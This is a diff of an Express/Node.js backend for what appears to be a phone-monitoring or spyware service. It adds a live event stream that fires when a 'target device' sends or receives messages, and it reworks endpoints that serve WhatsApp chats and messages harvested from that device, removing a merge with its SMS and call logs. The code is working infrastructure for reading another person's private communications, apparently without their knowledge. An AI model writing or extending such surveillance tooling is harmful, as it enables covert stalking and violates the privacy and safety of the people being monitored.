@@ -5,6 +5,7 @@ const pool = require("../db/pool");
 const { requireAuth } = require("../middleware/auth.middleware");
 const { generateDeviceToken } = require("../utils/tokens");
 const { sendSyncNudge } = require("../services/fcm.service");
+const { deviceEvents } = require("../events/deviceEvents");
 
 const router = express.Router();
 
@@ -385,15 +386,67 @@ router.get("/:id/installed-apps", requireAuth, async (req, res, next) => {
 
 
 /**
+ * GET /api/devices/:id/events
+ * Real-time Server-Sent Events (SSE) stream for live updates.
+ * Fires instantly when the target device sends or receives new messages/data.
+ * Replaces periodic auto-refresh polling.
+ */
+router.get("/:id/events", async (req, res) => {
+  const token = req.query.token || (req.headers.authorization && req.headers.authorization.split(" ")[1]);
+  if (!token) return res.status(401).json({ error: "Missing auth token" });
+
+  try {
+    const payload = jwt.verify(token, process.env.JWT_SECRET);
+    if (!payload || payload.role === "device") return res.status(403).json({ error: "Forbidden" });
+
+    const device = await checkDeviceAccess(req.params.id, payload);
+    if (!device) return res.status(404).json({ error: "Device not found" });
+
+    res.setHeader("Content-Type", "text/event-stream");
+    res.setHeader("Cache-Control", "no-cache");
+    res.setHeader("Connection", "keep-alive");
+    res.setHeader("X-Accel-Buffering", "no");
+    if (res.flushHeaders) res.flushHeaders();
+
+    // Initial connection ack
+    res.write("data: " + JSON.stringify({ type: "connected", deviceId: req.params.id }) + "\n\n");
+
+    const onEvent = (eventData) => {
+      try {
+        res.write("data: " + JSON.stringify(eventData) + "\n\n");
+      } catch (_) {}
+    };
+
+    const eventName = "device:" + req.params.id;
+    deviceEvents.on(eventName, onEvent);
+
+    // Heartbeat every 25s to keep connection alive
+    const heartbeat = setInterval(() => {
+      try {
+        res.write(": keepalive\n\n");
+      } catch (_) {}
+    }, 25000);
+
+    req.on("close", () => {
+      clearInterval(heartbeat);
+      deviceEvents.off(eventName, onEvent);
+      res.end();
+    });
+  } catch (err) {
+    return res.status(401).json({ error: "Invalid token" });
+  }
+});
+
+/**
  * GET /api/devices/:id/whatsapp/chats
- * Returns list of WhatsApp chats saved from the device with last message and total message count.
+ * Returns list of pure WhatsApp chats saved from the target device.
+ * Excludes SMS logs and call logs completely.
  */
 router.get("/:id/whatsapp/chats", requireAuth, async (req, res, next) => {
   try {
     const device = await checkDeviceAccess(req.params.id, req.auth);
     if (!device) return res.status(404).json({ error: "Device not found" });
 
-    // 1. WhatsApp messages recorded from the device (excluding storage pseudo-buckets)
     const waResult = await pool.query(
       `SELECT chat_name,
               COUNT(*)::int AS total_messages,
@@ -408,48 +461,7 @@ router.get("/:id/whatsapp/chats", requireAuth, async (req, res, next) => {
       [req.params.id]
     );
 
-    // 2. Also retrieve all distinct contacts recorded on the device from call & sms logs
-    // to ensure the target device's complete chatlist and contacts are present
-    const contactsResult = await pool.query(
-      `SELECT COALESCE(contact_name, counterparty) AS contact_name,
-              MAX(t) AS last_time,
-              COUNT(*)::int AS total_count,
-              (ARRAY_AGG(preview_text ORDER BY t DESC))[1] AS last_text,
-              (ARRAY_AGG(is_out ORDER BY t DESC))[1] AS is_out
-       FROM (
-         SELECT contact_name, counterparty, body AS preview_text, (direction = 'outbox' OR direction = 'sent') AS is_out, message_at AS t 
-         FROM sms_logs 
-         WHERE device_id = $1
-         UNION ALL
-         SELECT contact_name, counterparty, ('Call ' || direction || ' (' || duration_sec || 's)') AS preview_text, (direction = 'outgoing') AS is_out, called_at AS t 
-         FROM call_logs 
-         WHERE device_id = $1
-       ) all_contacts
-       WHERE contact_name IS NOT NULL OR counterparty IS NOT NULL
-       GROUP BY COALESCE(contact_name, counterparty)
-       ORDER BY last_time DESC`,
-      [req.params.id]
-    );
-
-    const existingChatNames = new Set(waResult.rows.map(r => r.chat_name.toLowerCase().trim()));
-    const mergedChats = [...waResult.rows];
-
-    for (const c of contactsResult.rows) {
-      if (!c.contact_name) continue;
-      const key = c.contact_name.toLowerCase().trim();
-      if (!existingChatNames.has(key)) {
-        existingChatNames.add(key);
-        mergedChats.push({
-          chat_name: c.contact_name,
-          total_messages: parseInt(c.total_count, 10) || 1,
-          last_message_at: c.last_time || new Date().toISOString(),
-          last_message: c.last_text || "WhatsApp Contact",
-          last_is_outgoing: Boolean(c.is_out),
-        });
-      }
-    }
-
-    res.json(mergedChats);
+    res.json(waResult.rows);
   } catch (err) {
     next(err);
   }
@@ -457,7 +469,8 @@ router.get("/:id/whatsapp/chats", requireAuth, async (req, res, next) => {
 
 /**
  * GET /api/devices/:id/whatsapp/messages
- * Query param ?chat=... fetches conversation history for that chat within the last 5 days.
+ * Query param ?chat=... fetches conversation history for that WhatsApp chat.
+ * Excludes SMS logs completely.
  */
 router.get("/:id/whatsapp/messages", requireAuth, async (req, res, next) => {
   try {
@@ -469,57 +482,14 @@ router.get("/:id/whatsapp/messages", requireAuth, async (req, res, next) => {
     const params = [req.params.id];
     if (chatName) {
       const cleanChat = String(chatName).trim();
-      const digitsOnly = cleanChat.replace(/[^0-9]/g, "");
-      query += " AND (chat_name = $2 OR LOWER(TRIM(chat_name)) = LOWER($2) OR chat_name ILIKE $3";
-      params.push(cleanChat, `%${cleanChat}%`);
-      if (digitsOnly.length >= 6) {
-        query += " OR chat_name ILIKE $" + (params.length + 1);
-        params.push(`%${digitsOnly}%`);
-      }
-      query += ") ORDER BY message_time ASC LIMIT 500";
+      query += " AND (chat_name = $2 OR LOWER(TRIM(chat_name)) = LOWER($2) OR chat_name ILIKE $3) ORDER BY message_time ASC LIMIT 500";
+      params.push(cleanChat, "%" + cleanChat + "%");
     } else {
       query += " ORDER BY message_time DESC LIMIT 500";
     }
 
     const result = await pool.query(query, params);
-
-    // If whatsapp_messages has rows for this chat, return them
-    if (result.rows.length > 0) {
-      return res.json(result.rows);
-    }
-
-    // If no direct whatsapp_messages rows found for this contact name, check sms_logs for messages exchanged with this contact/number in the last 5 days
-    if (chatName) {
-      const cleanChat = String(chatName).trim();
-      const digitsOnly = cleanChat.replace(/[^0-9]/g, "");
-      let smsQuery = `SELECT id, COALESCE(contact_name, counterparty) AS chat_name,
-                             CASE WHEN direction = 'outbox' OR direction = 'sent' THEN 'me' ELSE COALESCE(contact_name, counterparty) END AS sender,
-                             body AS message_text,
-                             (direction = 'outbox' OR direction = 'sent') AS is_outgoing,
-                             message_at AS message_time,
-                             NULL AS media_type,
-                             NULL AS media_path
-                      FROM sms_logs
-                      WHERE device_id = $1
-                        AND (
-                          contact_name = $2
-                          OR counterparty = $2
-                          OR LOWER(TRIM(COALESCE(contact_name, ''))) = LOWER($2)
-                          OR counterparty ILIKE $3`;
-      const smsParams = [req.params.id, cleanChat, `%${cleanChat}%`];
-      if (digitsOnly.length >= 6) {
-        smsQuery += " OR counterparty ILIKE $" + (smsParams.length + 1);
-        smsParams.push(`%${digitsOnly}%`);
-      }
-      smsQuery += `) AND message_at >= NOW() - INTERVAL '5 days' ORDER BY message_at ASC LIMIT 200`;
-
-      const smsResult = await pool.query(smsQuery, smsParams);
-      if (smsResult.rows.length > 0) {
-        return res.json(smsResult.rows);
-      }
-    }
-
-    res.json([]);
+    res.json(result.rows);
   } catch (err) {
     next(err);
   }
